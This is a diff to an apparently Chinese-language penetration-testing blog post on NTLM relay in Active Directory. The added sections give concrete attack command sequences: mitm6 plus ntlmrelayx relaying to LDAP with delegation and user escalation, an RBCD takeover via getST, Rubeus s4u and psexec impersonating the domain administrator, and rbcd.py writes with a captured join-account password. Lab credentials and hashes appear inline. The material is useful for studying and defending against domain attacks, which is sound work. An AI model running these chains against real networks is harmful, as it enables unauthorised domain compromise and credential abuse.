@@ -13,9 +13,6 @@
 
 ![NTLM relay.drawio.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/NTLM%20relay.drawio-20211202170757-i62539k.png "https://www.thehacker.recipes/ad/movement/ntlm/relay")
 
-
-原理直接看国外老哥写的这篇文章[NTLM RELAY](https://en.hackndo.com/ntlm-relay/)。本文主要讲Relay的一些路径。
-
 ## 触发NTLM认证。
 
 ### SMB
@@ -31,7 +28,7 @@ https://github.com/topotam/PetitPotam
 
 如果机器开启lsarpc的匿名访问。即可在不知道账户密码的情况下触发强制身份认证。
 
-![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png)
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218102251-pzz6y1y.png "das")
 
 
 #### PrinterBug（MS-RPRN）
@@ -111,11 +108,21 @@ https://www.bettercap.org/installation/
 
 https://github.com/dirkjanm/mitm6
 
+这里我使用物理机演示。
+
 ```bash
 Inveigh.exe -spooferip 192.168.52.129
 ```
 
 ![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220217205227-0dfqqn1.png)
+
+```bash
+sudo python3 mitm6/mitm6.py  -d adc.com --interface eth0
+
+python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\$ -wh wpad -6
+```
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222210350-y9piovo.png)
 
 #### 邮件钓鱼
 
@@ -242,7 +249,7 @@ python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --re
 
 ### 创建用户（LDAPS）
 
-1. **添加机器账户**：
+#### 添加机器账户
 
 域有个属性`ms-DS-MachineAccountQuota` 他标志着非特权用户最多添加多少机器账户到域内。默认为10。
 
@@ -254,7 +261,7 @@ python3 ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer testpc$ --remove-mic
 
 ![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234415-6pv0p08.png)
 
-2. **添加普通用户**
+#### 添加普通用户
 
 需要高权限账户（比如说域管）才可以，
 
@@ -265,6 +272,8 @@ python3 ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic
 ![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220219234733-4hm6ef9.png)
 
 ### Exchange
+
+#### LDAP
 
 **存在CVE-2019-1040漏洞的情况下，可以从SMB->LDAP(s)。而无需考虑签名的情况。**
 
@@ -303,9 +312,16 @@ python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -
 
 ![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220215192403-wbh2ws4.png)
 
+#### EWS
+
+>  Exchange的认证也是支持NTLM SSP的。我们可以relay到Exchange，从而收发邮件，代理等等。在使用outlook的情况下还可以通过homepage或者下发规则达到命令执行的效果。而且这种Relay还有一种好处，将Exchange开放在外网的公司并不在少数，我们可以在外网发起relay，而不需要在内网，这是最刺激的。([Net- NTLM 利用 - windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#2.-relay2ews))
+
+[https://github.com/Arno0x/NtlmRelayToEWS](https://github.com/Arno0x/NtlmRelayToEWS)
+
+
 ### 影子凭证（Shadow Credentials）
 
-1. 隐蔽权限维持。
+#### 隐蔽权限维持。
 
 > 常规Kerberos预认证阶段（pre-auth），客户端用自己的hash加密时间戳给KDC。KDC使用该用户的hash解密，验证通过后返回该用户的TGT。这是对称加密（DES、RC4、AES128、AES256）。Kerberos也支持非对称的认证方式，通过证书（PKINIT）或密钥对实现。需要安装ADCS。​
 >
@@ -349,7 +365,7 @@ python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yang
 
 ![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220218150542-0wvho1i.png)
 
-2. **结合NTLM Relay**
+#### 结合NTLM Relay
 
 [https://github.com/SecureAuthCorp/impacket/pull/1249](https://github.com/SecureAuthCorp/impacket/pull/1249)
 
@@ -359,7 +375,66 @@ python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yang
 
 ### RBCD（低权限）
 
-当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。
+基于资源的约束性委派又名RBCD。
+
+配置约束性委派和非约束性委派都需要`SeEnableDelegation`权限。而这个权限一般只有域管才有。为了赋予用户更大的灵活性，微软在`Windows server 2012`中引进基于资源的约束性委派。
+
+> 基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用。
+>
+
+* 配置基于资源的约束性委派，无需`SeEnableDelegation`权限，**只需要对机器具有写属性权限（WriteProperty）。即可配置。**
+* `msDS-AllowedToDelegateTo` 变成了 `msDS-AllowedToActOnBehalfOfOtherIdentity`。但是方向相反。参照下图。
+
+也就是说，serviceB上配置`msDS-AllowedToActOnBehalfOfOtherIdentity`的值为serviceA。那么serviceB就信任来自serviceA的委派。也就是下图的**传出信任**与**传入信任**。
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222144349-xcq29ok.png "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html")
+
+
+
+#### Relay
+
+```bash
+自动创建一个机器账户，密码随机。需要ldaps。
+python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --remove-mic --delegate-access  -smb2support
+指定机器账户
+python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\$ 
+```
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222170958-664dzj8.png)
+
+```bash
+python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com'  -dc-ip 10.10.10.10 'adc.com/USCJNQTK\$:'
+export KRB5CCNAME=administrator.ccache
+python3 psexec.py -no-pass -k 'adc.com/administrator@web2.adc.com'
+```
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222190456-prkusyk.png)
+
+```bash
+计算hash
+.\Rubeus.exe hash /domain:adc.com /user:USCJNQTK$ /password:"iJ'vp3V>'4De}tf"
+请求st
+.\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt
+```
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220222193840-78dynwb.png)
+
+#### 加域账户
+
+> 当一个用户给一台机器加域后，该用户就对该机器具有写属性权限（WriteProperty）。而企业中往往都会有一个专门的加域用户，当我们拿到了这个加域用户的凭据后，我们就可以通过RBCD控制由该用户加入域内所有机器的权限。
+>
+
+首先假设我们抓到了加域账户（`join`）的哈希或密码。
+
+```bash
+python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10
+python3 rbcd.py -delegate-to 'web2' -delegate-from USCJNQTK  -action write 'adc.com/join:song@2020' -dc-ip 10.10.10.10
+python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10
+python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com'  -dc-ip 10.10.10.10 'adc.com/USCJNQTK\$:'
+
+```
+
+![image.png](https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223105504-eczkohp.png)
 
 
 ## 参考
@@ -372,5 +447,9 @@ python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yang
 
 [安全研究 | 使用PetitPotam代替Printerbug](https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ)
 
+[【M01N】资源约束委派和NTLM Relaying的组合拳接管域内任意主机系统权限 – 绿盟科技技术博客](http://blog.nsfocus.net/combination-resource-constrained-delegation-ntlm-relaying-takes-privileges-host-system-domain/)
+
 [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+
+[Lateral Movement – WebClient – Penetration Testing Lab](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
 
